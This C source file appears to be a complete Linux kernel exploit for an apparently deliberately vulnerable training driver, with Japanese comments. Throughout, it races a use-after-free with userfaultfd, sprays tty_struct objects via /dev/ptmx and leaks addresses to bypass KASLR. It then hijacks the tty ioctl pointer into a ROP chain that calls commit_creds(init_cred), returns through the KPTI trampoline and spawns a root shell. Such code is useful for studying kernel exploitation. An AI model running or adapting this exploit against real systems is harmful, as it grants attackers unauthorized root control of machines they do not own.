#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc3c3c0
#define rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp (kbase + 0x09b13a)
#define rop_pop_rdi (kbase + 0x09b0ed)
#define addr_init_cred (kbase + 0xe37480)
#define addr_commit_creds (kbase + 0x072830)
#define addr_kpti_trampoline (kbase + 0x800e26)

typedef struct {
    int id;
    size_t size;
    char* data;
} request_t;

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;
cpu_set_t pwn_cpu;
char* buf;
int victim;
uint32_t fd;
uint32_t spray[100];
uint64_t kbase, g_buf;

int race_win;

void save_state()
{
    asm volatile(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");

    INFO("Saved state");
}

static void win()
{
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

int add(char* data, size_t size)
{
    request_t req = { .size = size, .data = data };
    return ioctl(fd, CMD_ADD, &req);
}

int del(int id)
{
    request_t req = { .id = id };
    return ioctl(fd, CMD_DEL, &req);
}

int get(int id, char* data, size_t size)
{
    request_t req = { .id = id, .size = size, .data = data };
    return ioctl(fd, CMD_GET, &req);
}

int set(int id, char* data, size_t size)
{
    request_t req = { .id = id, .size = size, .data = data };
    return ioctl(fd, CMD_SET, &req);
}

static void* fault_handler_thread(void* arg)
{
    char* dummy_page;
    static struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd pollfd;
    long uffd;
    static int fault_cnt = 0;

    /* メインスレッドと同じCPUで動かす */
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        ERROR("handler sched_setaffinity");

    uffd = (long)arg;

    puts("[+] fault_handler_thread: waiting for page fault...");
    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    while (poll(&pollfd, 1, -1) > 0) {
        if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
            ERROR("poll");

        /* ページフォルト待機 */
        if (read(uffd, &msg, sizeof(msg)) <= 0)
            ERROR("read(uffd)");
        assert(msg.event == UFFD_EVENT_PAGEFAULT);

        switch (fault_cnt++) {
        case 0:
        case 1:
            SUCCESS("UAF read %d times", fault_cnt - 1);

            del(victim);

            // START SPRAY
            for (int i = 0; i < 0x10; i++) {
                spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                if (spray[i] == -1)
                    ERROR("/dev/ptmx");
            }
            // END SPRAY

            copy.src = (uint64_t)buf;
            break;

        case 2: {
            puts("[+] UAF write");
            for (int i = 0; i < 0x100; i++) {
                add(buf, 0x400);
            }

            del(victim);

            // START SPRAY
            for (int i = 0; i < 0x10; i++) {
                spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                if (spray[i] == -1)
                    ERROR("/dev/ptmx");
            }
            // END SPRAY

            copy.src = (uint64_t)buf;
            break;
        }

        default:
            ERROR("Unexpected page fault");
        }

        copy.dst = (unsigned long)msg.arg.pagefault.address;
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &copy) == -1)
            ERROR("ioctl(UFFDIO_COPY)");
    }

    return NULL;
}

int register_uffd(void* addr, size_t len)
{
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    long uffd;
    pthread_t th;

    /* userfaultfdの作成 */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        ERROR("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        ERROR("ioctl(UFFDIO_API)");

    /* ページをuserfaultfdに登録 */
    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        ERROR("UFFDIO_REGISTER");

    /* ページフォルトを処理するスレッドを作成 */
    if (pthread_create(&th, NULL, fault_handler_thread, (void*)uffd))
        ERROR("pthread_create");

    return 0;
}

int main()
{
    save_state();

    /* メインスレッドとuffdハンドラが必ず同じCPUで動くよう設定する */
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        ERROR("sched_setaffinity");

    fd = open("/dev/fleckvieh", O_RDWR);
    if (fd == -1)
        ERROR("/dev/dexter");

    void* page;
    page = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
        ERROR("mmap");
    register_uffd(page, 0x3000);

    buf = (char*)malloc(0x400);
    // KASLRの回避
    victim = add(buf, 0x400);
    get(victim, page, 0x20); // page fault 0
    kbase = *(uint64_t*)&page[0x18] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    victim = add(buf, 0x400);
    get(victim, page + 0x1000, 0x400); // page fault 1
    g_buf = *(uint64_t*)&page[0x1000 + 0x38] - 0x38;
    printf("[+] g_buf = 0x%016lx\n", g_buf);
    // END KASLRの回避
    for (int i = 0; i < 0x10; i++)
        close(spray[i]);

    memcpy(buf, page + 0x1000, 0x400);
    unsigned long* tty = (unsigned long*)buf;
    tty[0] = 0x0000000100005401; // magic
    tty[2] = *(unsigned long*)(page + 0x10); // dev
    tty[3] = g_buf; // ops
    tty[12] = rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp; // ops->ioctl

    unsigned long* chain = (unsigned long*)(buf + 0x100);
    *chain++ = 0xdeadbeef; // pop rbp
    *chain++ = rop_pop_rdi;
    *chain++ = addr_init_cred;
    *chain++ = addr_commit_creds;
    *chain++ = addr_kpti_trampoline;
    *chain++ = 0xdeadbeef;
    *chain++ = 0xdeadbeef;
    *chain++ = (unsigned long)&win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    victim = add(buf, 0x400);
    set(victim, page + 0x2000, 0x400); // page fault 2

    for (int i = 0; i < 0x10; i++) {
        ioctl(spray[i], 0, g_buf + 0x100);
    }

    return 0;
}